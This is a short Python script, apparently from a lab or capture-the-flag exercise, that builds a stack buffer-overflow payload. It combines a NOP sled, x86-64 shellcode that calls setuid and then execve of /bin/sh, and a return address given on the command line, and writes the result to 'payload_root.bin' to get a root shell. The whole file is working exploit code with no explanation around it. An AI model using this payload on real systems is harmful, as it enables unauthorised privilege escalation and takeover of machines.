import os
import subprocess
import sys
import struct

ret_address = struct.pack('<Q', int(sys.argv[1], 16))

setuid = b'\x48\x31\xc0\x48\x31\xf6\xb0\x17\x0f\x05'

shellcode = b'\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'

nop = b'\x90'

payload = nop * 13 + setuid + shellcode + nop * 37 + ret_address

with open('payload_root.bin', 'wb') as f:
    f.write(payload)
